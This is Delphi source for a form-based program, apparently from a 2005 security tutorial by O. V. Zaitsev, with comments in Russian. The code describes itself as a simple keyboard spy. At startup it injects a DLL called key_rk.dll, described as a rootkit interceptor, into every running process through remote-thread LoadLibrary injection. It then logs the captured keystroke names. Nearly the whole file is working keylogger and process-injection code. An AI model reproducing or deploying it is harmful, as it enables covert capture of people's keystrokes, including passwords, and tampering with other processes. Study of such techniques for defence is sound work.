unit Unit1;
// Простейший "Клавиатурный шпион" на базе ловушек
// Зайцев О.В, 2005. http://z-oleg.com/secur, http://z-oleg.com/delphi
// Для функционирования примера в папке программы должна находиться библиотека
// key_rk.dll, содержащая RootKit-перехвтчик.

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, TlHelp32;

const
  KeyEvent = WM_USER + 1;

type
  TKeyForm = class(TForm)
    meLogMemo: TMemo;
    procedure FormCreate(Sender: TObject);
  private
    procedure KeyEventHandler(var Msg : TMessage); message KeyEvent;
    function InjectDLLtoProcess(APID: dword; ADllName: string): boolean;
    procedure AddToLog(S : string); 
  public
    hLib: THandle;
  end;

var
  KeyForm: TKeyForm;

implementation

{$R *.dfm}

function TKeyForm.InjectDLLtoProcess(APID: dword; ADllName: string): boolean;
var
 hProcess       : THandle; // Handle процесса
 hRemoteThread  : THandle; // Handle удаленного потока
 NameBufPtr     : Pointer; // Адрес буфера с именем DLL
 LoadLibraryPtr : Pointer; // Адрес функции LoadLibrary
 NumberOfBytesWritten, ThreadId : dword;
begin
 Result := false;
 hProcess := 0; hRemoteThread := 0; NameBufPtr := nil;
 try
  // 1. Открываем процесс
  hProcess := OpenProcess(PROCESS_ALL_ACCESS, FALSE, APID);
  if hProcess = 0 then begin
   AddToLog('Ошибка открытия процесса');
   exit;
  end;
  // 2. Создаем в памяти процесса буфер для имени DLL
  NameBufPtr := VirtualAllocEx(hProcess, nil, Length(ADllName)+1, MEM_COMMIT, PAGE_READWRITE);
  if NameBufPtr = nil then begin
   AddToLog('Ошибка выделения буфера в памяти процесса');
   exit;
  end;
  // 3. Копируем имя в буфер
  if not(WriteProcessMemory(hProcess, NameBufPtr, PChar(ADllName), Length(ADllName)+1, NumberOfBytesWritten)) then begin
   AddToLog('Ошибка записи в память процесса');
   exit;
  end;
  // 4. Выполняем определение адреса kernel32.dll!LoadLibraryA
  LoadLibraryPtr := GetProcAddress(GetModuleHandle('kernel32.dll'), 'LoadLibraryA');
  if LoadLibraryPtr = nil then begin
   AddToLog('Ошибка определения адреса LoadLibraryA');
   exit;
  end;
  // 5. Выполняем создание удаленного потока
  hRemoteThread := CreateRemoteThread(hProcess, 0, 0,
                               LoadLibraryPtr, NameBufPtr, 0, ThreadId);
  if hRemoteThread <> 0 then begin
   // 6. Дожидаемся завершения потока (ждем 5 секунд)
   WaitForSingleObject(hRemoteThread, 5000);
   Result := true;
  end else
   AddToLog('Ошибка создания удаленного потока');
 finally
  // Освобождение памяти и закрытие Handle потока и процесса
  if NameBufPtr <> nil then
   VirtualFreeEx(hProcess, NameBufPtr, 0, MEM_RELEASE);
  if hRemoteThread <> 0 then
   CloseHandle(hRemoteThread);
  if hProcess <> 0 then
   CloseHandle(hProcess);
 end;
end;

procedure TKeyForm.KeyEventHandler(var Msg: TMessage);
var
 KeyName : string;
 Res     : integer;
begin
 // ***** Получение наименования клавиши *****
 // Выделение буфера
 SetLength(KeyName, 32);
 // Получение имени по коду, Res - длина возвращенной строки
 Res := GetKeyNameText(Msg.LParam, @KeyName[1], Length(KeyName));
 KeyName := copy(KeyName, 1, Res);
 // Добавление в протокол
 meLogMemo.Lines.Add(KeyName);
end;

procedure TKeyForm.AddToLog(S: string);
begin
 meLogMemo.Lines.Add(S);
end;

procedure TKeyForm.FormCreate(Sender: TObject);
var
  hSnapshot : THandle;
  pe32      : TProcessEntry32;
begin
 // Создание "снимка" модулей текущего процесса
 hSnapshot := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, GetCurrentProcessId);
 if hSnapshot = INVALID_HANDLE_VALUE then
  exit;
 pe32.dwSize := SizeOf(TModuleEntry32);
 if (Process32First(hSnapshot, pe32)) then
  repeat
   InjectDLLtoProcess(pe32.th32ProcessID, ExtractFilePath(Application.ExeName)+'key_rk.dll');
  until not(Process32Next(hSnapshot, pe32));
 CloseHandle(hSnapshot);
end;
// InjectDLLtoProcess(GetCurrentProcessId, ExtractFilePath(Application.ExeName)+'key_rk.dll');

end.
